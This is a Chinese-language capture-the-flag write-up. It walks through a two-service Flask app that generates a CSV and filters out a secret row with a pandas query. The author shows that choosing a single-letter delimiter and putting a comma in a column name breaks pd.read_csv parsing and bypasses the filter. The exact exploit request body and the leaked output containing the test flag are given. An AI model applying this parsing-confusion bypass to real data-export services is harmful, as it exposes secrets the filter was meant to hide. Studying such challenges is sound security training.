感觉很新奇的解析漏洞？

源码如下 app.py

```python
from flask import Flask, request, send_file
from io import StringIO, BytesIO
import pandas as pd
import requests

app = Flask(__name__)

proxies = {
  "http": None,
  "https": None,
}
@app.route("/")
def index():
    return app.send_static_file('index.html')


@app.route("/generate", methods=['POST'])
def generate():
    data = request.form
    delimiter_const = 'delimiter'
    r = requests.post('http://127.0.0.1:5001', data=data,proxies=proxies)
    if r.text == 'ERROR':
        return 'ERROR'

    csv = StringIO(r.text)

    df = pd.read_csv(csv)

    # Filter out secrets
    first = list(df.columns.values)[1]
    df = df.query(f'{first} != "FLAG"')

    string_df = StringIO(df.to_csv(index=False, sep=data[delimiter_const]))
    bytes_df = BytesIO()
    bytes_df.write(string_df.getvalue().encode())
    bytes_df.seek(0)

    return send_file(bytes_df, download_name="data.csv")
if __name__ == '__main__':
    app.run()
```

generator_app.py

```python
from flask import Flask, request
import random as rnd

app = Flask(__name__)

flag = "flag{test}"


@app.route("/", methods=['POST'])
def index():
    delimiter = request.form['delimiter']

    if len(delimiter) > 1:
        return 'ERROR'

    num_columns = int(request.form['numColumns'])
    if num_columns > 10:
        return 'ERROR'

    headers = ['id'] + [request.form["columnName" + str(i)] for i in range(num_columns)]

    forb_list = ['and', 'or', 'not']

    for header in headers:
        if len(header) > 120:
            return 'ERROR'
        for c in '\'"!@':
            if c in header:
                return 'ERROR'
        for forb_word in forb_list:
            if forb_word in header:
                return 'ERROR'

    csv_file = delimiter.join(headers)

    for i in range(10):
        row = [str(i)] + [str(rnd.randint(0, 100)) for _ in range(num_columns)]
        csv_file += '\n' + delimiter.join(row)

    row = [str('NaN')] + ['FLAG'] + [flag] + [str(0) for _ in range(num_columns)]
    csv_file += '\n' + delimiter.join(row[:len(headers)])

    return csv_file
if __name__ == "__main__":
    app.run(host='127.0.0.1', port=5001)

```

在本地搭建环境的时候发现 r = requests.post('http://127.0.0.1:5001', data=data,proxies=proxies)会有问题，

查了相关资料后发现是我设置了代理，发给代理站后无法正确解析127.0.0.1所以报错

然后本地搭建环境后发现大概就是生成一个随机矩阵，

一直在想query的问题，没想到是控制delimiter来造成pd.read_csv(csv)的错误

其实这样一想你能把delimiter放出来确实是有问题的

可以构造delimiter为任意字符，然后column name=C1,

在列名中构造一个，从而导致read_csv解析错误

最终的exp如下

```
numColumns=6&columnName0=test&columnName1=C1,&columnName2=2&columnName3=&columnName4=&columnName5=&delimiter=a
```



返回的数据即可带回flag
```
"idatestaC1"a"a2aaa"
"0a24a78a90a57a61a76"a
"1a29a60a25a22a33a19"a
"2a44a83a40a21a29a20"a
"3a35a49a82a64a94a76"a
"4a69a34a3a23a49a26"a
"5a2a7a22a12a77a64"a
"6a95a50a43a38a66a7"a
"7a7a3a82a97a38a40"a
"8a7a83a11a28a8a94"a
"9a44a90a16a11a67a70"a
"NaNaFLAGaflag{test}a0a0a0a0"a
```

